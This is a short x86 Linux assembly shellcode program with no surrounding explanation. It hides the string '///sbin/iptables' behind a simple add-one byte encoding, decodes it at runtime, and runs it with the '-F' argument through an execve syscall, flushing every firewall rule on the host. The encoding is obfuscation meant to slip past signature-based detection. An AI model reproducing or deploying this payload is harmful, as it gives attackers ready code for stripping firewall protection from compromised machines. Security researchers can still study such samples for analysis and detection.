section .text
    global _start

_start:
    xor edx, edx
    push edx
    mov bx, 0x2316
    add bx, 0x2317
    push bx
    mov ebp, esp
    push edx
    push 0x72646b61
    push 0x60736F68
    push 0x2e6d6861
    push 0x722e2e2e
    mov ebx, esp
; Decryption 
    mov esi, esp
    mov edi, esp
    mov cl, 16
.decrypt:
    lodsb
    add eax, 1
    stosb
    loop .decrypt
    push edx
    std
    push ebp
    cld
    push ebx
    mov ecx, esp
    push 0xb
    pop eax
    int 80h 
